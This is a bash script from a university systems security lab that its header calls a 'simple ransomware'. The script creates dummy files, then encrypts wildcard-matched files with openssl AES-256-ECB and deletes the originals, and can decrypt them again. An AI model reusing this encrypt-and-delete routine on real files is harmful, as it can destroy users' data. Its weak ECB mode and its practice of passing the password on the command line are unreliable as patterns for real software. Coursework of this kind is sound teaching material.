#!/bin/bash   
# the line above shows which shell to execute the bash script with

# Systems Security Class 2021, Technical University of Crete
# Lab no. 5
# "create a simple ransomware"

FILEDIR=$1

# create the directory, if it does not already exist
mkdir -p $FILEDIR

echo -n "Enter 0 to create, 1 to encrypt, and 2  to decrypt files: "
read choice

if [[ $choice -eq 2 ]]
then
	echo " **decryption mode**"
	echo -e "enter the input filename(or filenames, ls with wildcards): "
	read input
	echo -e "enter password: "
	read -s pass
	N_OF_FILES=$(ls $FILEDIR/$input| wc -l)
        echo -n "0%|--------------------------------------------------|100%"
        printf '\r'
        COUNT=1
	for FILE in $(ls $FILEDIR/$input)  
	do
		export LD_PRELOAD=./logger.so ; openssl aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.dec -d -k $pass 
		rm $FILE
		PERC=$(( COUNT*100 )) ; PERC=$(( PERC/N_OF_FILES ))
                echo -n "$PERC%|"
                for i in $(seq 1 5 $PERC)
                do
                        echo -n "█"
                done
                printf '\r'
                COUNT=$(( COUNT+1 ))
        done
        echo ""
        printf '\e[A\e[K'



elif [[ $choice -eq 1 ]]
then 
	echo " **Encryption mode**"
	echo -e "Enter the input filename(or filenames, with ls wildcards): "
	read input
	echo -e "Enter password: "
	read -s pass
	N_OF_FILES=$(ls $FILEDIR/$input| wc -l)
	echo -n "0%|--------------------------------------------------|100%"
	printf '\r'
	COUNT=1
	for FILE in $(ls $FILEDIR/$input)
        do
		export LD_PRELOAD=./logger.so ; openssl enc -aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.enc -k $pass 
		rm $FILE
		PERC=$(( COUNT*100 )) ;	PERC=$(( PERC/N_OF_FILES ))
		echo -n "$PERC%|"
		for i in $(seq 1 2 $PERC)
		do
			echo -n "█"
		done
		printf '\r'  
		COUNT=$(( COUNT+1 ))
	done
	echo ""  
	printf '\e[A\e[K'  

elif [[ $choice -eq 0  ]]
then
	echo "How many files to create:"
	read number_of_files
	echo "Basic Filename:"
	read filename
	COUNT=1
	echo -n "0%|--------------------------------------------------|100%"
	printf '\r'
	for number in $(seq 1 $number_of_files)
	do
		# here we print a random string in the files specified
		tr -dc A-Za-z0-9 </dev/urandom | head -c 5000 > $FILEDIR/$filename$number

		# and then calculate the percentage that is created:
		PERC=$(( COUNT*100 ))  # we must first make COUNT bigger, bcoz shell cant handle floats!!
		PERC=$(( PERC/number_of_files ))

		# and use the percentage to print a loading bar:
		echo -n "$PERC%|"
		for i in $(seq 1 2 $PERC)  # step is 5 to reduce length of loading bar
		do
			echo -n "█"
		done
		printf '\r'  # return the cursor to the beginning of output line
		COUNT=$(( COUNT+1 ))
	done
	# flush the output:
	echo ""  #go to the next line
	printf '\e[A\e[K'  # erase previous output line
else
	echo "Wrong Option."
fi
